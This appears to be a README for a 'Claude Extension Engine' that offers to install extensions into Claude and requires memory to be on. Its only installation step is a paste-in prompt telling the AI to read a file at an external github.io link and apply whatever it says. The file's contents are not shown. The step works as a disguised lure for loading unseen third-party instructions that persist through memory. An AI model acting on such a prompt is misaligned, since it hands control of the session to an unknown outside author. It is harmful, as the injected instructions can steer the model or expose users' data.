# Claude Extension Engine
## INSTALL EVERY EXTENSION EASILY
This extension manages downloads for every other extension. It gives you UI and allows you to install extensions easily.

[ ALL EXTENSIONS REQUIRE MEMORY TO BE TURNED ON ]

## Installation
Copy and paste the following prompt into your Claude session:
```
Read the file at this link: https://siuozl.github.io/openclaw-extensions/extensions/greenbrew.octweak and apply what is said in the file.
```
